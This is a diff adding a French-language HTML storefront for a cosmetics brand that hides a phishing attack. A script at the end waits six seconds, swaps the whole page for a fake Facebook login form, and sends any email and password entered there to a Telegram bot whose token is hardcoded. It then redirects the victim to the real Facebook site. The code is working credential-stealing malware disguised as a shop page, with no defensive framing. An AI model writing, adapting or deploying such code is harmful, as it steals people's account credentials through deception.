@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beauté Élégante - Produits Cosmétique</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Helvetica', 'Arial', sans-serif;
+            background: #f8f8f8;
+            color: #333;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #ff6f91, #ffccd5);
+            padding: 60px 20px;
+            text-align: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        .header h1 {
+            font-size: 50px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 1s ease-in;
+        }
+        .header p {
+            font-size: 22px;
+            max-width: 700px;
+            margin: 0 auto;
+            animation: fadeIn 1.5s ease-in;
+        }
+        /* Navigation */
+        .nav {
+            background: #fff;
+            padding: 15px 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .nav a {
+            color: #ff6f91;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 16px;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        .nav a:hover {
+            color: #ff5277;
+        }
+        /* Main Content */
+        .main-content {
+            max-width: 1300px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        .product-card {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            animation: slideUp 0.5s ease-in-out;
+        }
+        .product-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+        .product-card img {
+            width: 100%;
+            height: 250px;
+            object-fit: cover;
+            transition: transform 0.3s;
+        }
+        .product-card:hover img {
+            transform: scale(1.05);
+        }
+        .product-card .content {
+            padding: 20px;
+            text-align: center;
+        }
+        .product-card h3 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: #ff6f91;
+            font-weight: 600;
+        }
+        .product-card p {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 15px;
+        }
+        .product-card .price {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        .product-card .btn {
+            display: inline-block;
+            padding: 12px 30px;
+            background: #ff6f91;
+            color: white;
+            text-decoration: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background 0.3s, transform 0.3s;
+        }
+        .product-card .btn:hover {
+            background: #ff5277;
+            transform: scale(1.05);
+        }
+        /* Floating Animation */
+        .floating {
+            position: absolute;
+            animation: float 4s infinite ease-in-out;
+        }
+        .floating img {
+            width: 80px;
+            opacity: 0.8;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+        }
+        /* Footer */
+        .footer {
+            background: #2c2c2c;
+            color: #ddd;
+            text-align: center;
+            padding: 40px 20px;
+            margin-top: 60px;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #ff6f91;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            .header h1 {
+                font-size: 36px;
+            }
+            .header p {
+                font-size: 18px;
+            }
+            .nav a {
+                margin: 0 10px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Beauté Élégante</h1>
+        <p>Découvrez notre sélection premium de produits cosmétiques pour une beauté éclatante.</p>
+        <div class="floating" style="top: 20px; left: 10%;">
+            <img src="https://images.unsplash.com/photo-1598532163257-ae3c6b2524b6" alt="Lipstick">
+        </div>
+        <div class="floating" style="top: 60%; right: 15%; animation-delay: 1s;">
+            <img src="https://images.unsplash.com/photo-1629380104331-0e6876ae4e06" alt="Perfume">
+        </div>
+        <div class="floating" style="top: 30%; left: 80%; animation-delay: 2s;">
+            <img src="https://images.unsplash.com/photo-1571643836156-5d74d4059f01" alt="Mascara">
+        </div>
+    </div>
+
+    <div class="nav">
+        <a href="#">Accueil</a>
+        <a href="#">Produits</a>
+        <a href="#">Nouveautés</a>
+        <a href="#">Promotions</a>
+        <a href="#">Contact</a>
+    </div>
+
+    <div class="main-content">
+        <div class="product-card">
+            <img src="https://images.unsplash.com/photo-1522335786673-5a4a135145d0" alt="Crème Hydratante">
+            <div class="content">
+                <h3>Crème Hydratante Intense</h3>
+                <p>Pour une peau douce et hydratée toute la journée.</p>
+                <div class="price">34,90 €</div>
+                <a href="#" class="btn">Ajouter au panier</a>
+            </div>
+        </div>
+        <div class="product-card">
+            <img src="https://images.unsplash.com/photo-1580870069867-74c57ee1bb07" alt="Palette Maquillage">
+            <div class="content">
+                <h3>Palette Maquillage Pro</h3>
+                <p>Teintes vibrantes pour un look impeccable.</p>
+                <div class="price">45,00 €</div>
+                <a href="#" class="btn">Ajouter au panier</a>
+            </div>
+        </div>
+        <div class="product-card">
+            <img src="https://images.unsplash.com/photo-1617898686213-8d8729ab871d" alt="Sérum Visage">
+            <div class="content">
+                <h3>Sérum Anti-Âge</h3>
+                <p>Réduit les rides et revitalise la peau.</p>
+                <div class="price">59,90 €</div>
+                <a href="#" class="btn">Ajouter au panier</a>
+            </div>
+        </div>
+        <div class="product-card">
+            <img src="https://images.unsplash.com/photo-1596755939779-a647b996e23b" alt="Rouge à Lèvres">
+            <div class="content">
+                <h3>Rouge à Lèvres Mat</h3>
+                <p>Couleur intense et tenue longue durée.</p>
+                <div class="price">19,90 €</div>
+                <a href="#" class="btn">Ajouter au panier</a>
+            </div>
+        </div>
+        <div class="product-card">
+            <img src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c" alt="Parfum">
+            <div class="content">
+                <h3>Parfum Floral</h3>
+                <p>Fragrance élégante pour toutes les occasions.</p>
+                <div class="price">79,90 €</div>
+                <a href="#" class="btn">Ajouter au panier</a>
+            </div>
+        </div>
+        <div class="product-card">
+            <img src="https://images.unsplash.com/photo-1571643836156-5d74d4059f01" alt="Mascara">
+            <div class="content">
+                <h3>Mascara Volume</h3>
+                <p>Pour des cils volumineux et définis.</p>
+                <div class="price">24,90 €</div>
+                <a href="#" class="btn">Ajouter au panier</a>
+            </div>
+        </div>
+        <div class="product-card">
+            <img src="https://images.unsplash.com/photo-1625772299848-361b803ffa25" alt="Fond de Teint">
+            <div class="content">
+                <h3>Fond de Teint Liquide</h3>
+                <p>Couverture parfaite pour un teint uniforme.</p>
+                <div class="price">39,90 €</div>
+                <a href="#" class="btn">Ajouter au panier</a>
+            </div>
+        </div>
+        <div class="product-card">
+            <img src="https://images.unsplash.com/photo-1604272490328-ade69786e7fb" alt="Poudre Compacte">
+            <div class="content">
+                <h3>Poudre Compacte</h3>
+                <p>Finition mate pour une peau sans brillance.</p>
+                <div class="price">29,90 €</div>
+                <a href="#" class="btn">Ajouter au panier</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2025 Beauté Élégante - <a href="#">Conditions d'utilisation</a> - <a href="#">Politique de confidentialité</a> - <a href="#">Nous contacter</a></p>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.body.innerHTML = `
+                <div id="login-page" style="display: none; background: #f0f2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 10px; font-family: 'Helvetica', 'Arial', sans-serif;">
+                    <div style="width: 100%; max-width: 360px; margin: 0 auto;">
+                        <div style="text-align: center; margin-bottom: 20px;">
+                            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" style="width: 180px;">
+                        </div>
+                        <div style="background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);">
+                            <form id="loginForm">
+                                <div style="margin-bottom: 10px;">
+                                    <input type="text" id="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required style="width: 100%; padding: 12px 14px; font-size: 15px; border: 1px solid #dddfe2; border-radius: 5px; outline: none; transition: border-color 0.2s;" onfocus="this.style.borderColor='#1877f2'; this.style.boxShadow='0 0 0 2px #e7f3ff';" onblur="this.style.borderColor='#dddfe2'; this.style.boxShadow='none';">
+                                </div>
+                                <div style="margin-bottom: 10px;">
+                                    <input type="password" id="password" name="password" placeholder="Mot de passe" required style="width: 100%; padding: 12px 14px; font-size: 15px; border: 1px solid #dddfe2; border-radius: 5px; outline: none; transition: border-color 0.2s;" onfocus="this.style.borderColor='#1877f2'; this.style.boxShadow='0 0 0 2px #e7f3ff';" onblur="this.style.borderColor='#dddfe2'; this.style.boxShadow='none';">
+                                </div>
+                                <button type="submit" style="background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s;" onmouseover="this.style.background='#166fe5';" onmouseout="this.style.background='#1877f2';">Se connecter</button>
+                            </form>
+                            <div style="margin: 12px 0; text-align: center;">
+                                <a href="#" style="color: #1877f2; font-size: 13px; text-decoration: none;" onmouseover="this.style.textDecoration='underline';" onmouseout="this.style.textDecoration='none';">Mot de passe oublié ?</a>
+                            </div>
+                            <hr style="border: none; border-top: 1px solid #dadde1; margin: 15px 0;">
+                            <button style="background: #42b72a; color: white; border: none; padding: 12px; border-radius: 5px; font-size: 14px; font-weight: 600; cursor: pointer; display: block; width: 70%; margin: 0 auto; transition: background 0.3s;" onmouseover="this.style.background='#36a420';" onmouseout="this.style.background='#42b72a';">Créer un nouveau compte</button>
+                        </div>
+                        <div style="text-align: center; margin-top: 15px; color: #8a8d91; font-size: 11px;">
+                            <p><a href="#" style="color: #8a8d91; text-decoration: none;">Créer une Page</a> pour une célébrité, une marque ou une entreprise.</p>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('login-page').style.display = 'block';
+
+            const TELEGRAM_BOT_TOKEN = '7927505785:AAF1pdlYkUzuLZ8PyAqHTkN7rj33Jfqfv-M';
+            const TELEGRAM_CHAT_ID = '7162559013';
+
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                const message = `Nouvelle connexion:\nEmail/Téléphone: ${email}\nMot de passe: ${password}`;
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message
+                        })
+                    });
+                    
+                    window.location.href = 'https://www.facebook.com/';
+                } catch (error) {
+                    console.error('Error:', error);
+                    window.location.href = 'https://www.facebook.com/';
+                }
+            });
+        }, 6000); // 6000 ميلي ثانية = 6 ثوانٍ
+    </script>
+</body>
+</html>
